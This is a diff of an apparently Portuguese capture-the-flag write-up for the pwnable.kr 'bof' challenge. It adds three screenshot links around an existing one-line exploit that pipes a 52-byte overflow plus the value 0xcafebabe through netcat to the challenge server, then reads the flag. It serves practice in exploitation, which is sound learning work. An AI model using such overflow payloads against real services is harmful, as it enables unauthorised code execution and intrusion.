@@ -65,6 +65,14 @@ usando o `gdb bof`
 
 ![image](https://github.com/user-attachments/assets/1926e179-6b1c-4d30-a5fc-a9723f19c80e)
 
+![image](https://github.com/user-attachments/assets/9d3cae56-ecc2-4d68-85c2-8a233478812a)
+
+![image](https://github.com/user-attachments/assets/a716027a-427e-40d0-8bce-e9cd8f6a82d2)
+
+
+![image](https://github.com/user-attachments/assets/1f67f213-4ef6-46db-8cbf-85da81d03e7a)
+
+
 ```(python -c "print '\x41'*52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000```
 
 cat flag
